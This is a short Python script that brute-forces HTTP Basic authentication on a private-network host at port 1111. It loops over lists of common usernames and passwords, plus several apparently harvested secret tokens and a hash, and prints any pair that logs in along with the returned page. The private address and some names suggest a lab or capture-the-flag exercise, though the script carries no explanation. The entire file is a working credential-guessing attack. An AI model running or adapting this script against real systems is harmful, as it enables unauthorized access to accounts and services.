import urllib.request, base64

users = [
    'admin', 'administrator', 'mitigata', 'root', 'operator', 'logmon', 'monitor', 
    'sysadmin', 'sec-eng', 'tfm', 'user', 'guest', 'ops', 'dev', 'service'
]
passwords = [
    'admin_secret_token_2026',
    'SuperSecretAdminPass!2026',
    'cart_live_secret_token_99',
    'R3v3rs3_Th3_Z0n3',
    'admin', 'admin123', 'mitigata', 'password', 'root', '123456',
    'logmon', 'operator', '31d9d419d12f4fb42c375d7c8e04fdb7'
]

for u in users:
    for p in passwords:
        req = urllib.request.Request('http://192.168.60.139:1111/')
        cred = base64.b64encode(f'{u}:{p}'.encode()).decode()
        req.add_header('Authorization', f'Basic {cred}')
        try:
            with urllib.request.urlopen(req, timeout=2) as r:
                print(f"[+] SUCCESS! {u}:{p} -> {r.status}")
                print(r.read().decode())
                break
        except urllib.error.HTTPError as e:
            if e.code != 401:
                print(f"[*] {u}:{p} -> {e.code}")
        except Exception as e:
            pass
print("Finished checking candidate credentials on 1111.")

